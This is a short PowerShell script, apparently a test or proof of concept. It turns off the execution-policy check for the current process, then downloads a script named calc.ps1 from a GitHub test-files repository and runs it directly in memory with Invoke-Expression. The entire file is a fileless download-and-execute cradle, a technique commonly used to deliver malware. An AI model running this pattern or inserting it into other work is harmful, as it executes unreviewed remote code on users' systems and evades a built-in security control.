# Download the script from the specified URL and execute it in memory
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

$scriptUrl = "https://raw.githubusercontent.com/amohanta/test_files/refs/heads/main/calc.ps1"
Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl -UseBasicP | Select-Object -ExpandProperty Content)
